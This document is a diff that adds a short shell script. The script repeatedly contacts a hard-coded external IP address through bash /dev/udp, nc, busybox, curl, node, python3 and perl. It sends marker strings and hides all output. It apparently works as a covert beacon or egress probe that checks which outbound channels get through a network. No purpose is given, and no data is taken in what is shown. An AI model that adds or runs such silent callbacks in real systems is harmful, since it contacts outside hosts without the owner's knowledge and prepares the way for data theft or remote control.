@@ -1,0 +1,9 @@
+P=91.215.85.170
+bash -c 'exec 3<>/dev/udp/91.215.85.170/5353; printf u1 >&3' 2>/dev/null
+echo u2 | nc -u -w1 $P 5353 2>/dev/null
+echo u3 | busybox nc -u -w1 $P 5353 2>/dev/null
+curl -s -m 6 "http://$P:8099/u7" >/dev/null 2>&1
+node -e 'require("dgram").createSocket("udp4").send("u4",5353,"91.215.85.170")' >/dev/null 2>&1
+python3 -c 'import socket;socket.socket(2,2).sendto(b"u5",("91.215.85.170",5353))' >/dev/null 2>&1
+perl -e 'use IO::Socket::INET;$s=IO::Socket::INET->new(PeerAddr=>"91.215.85.170:5353",Proto=>"udp");print $s "u6"' >/dev/null 2>&1
+sleep 4
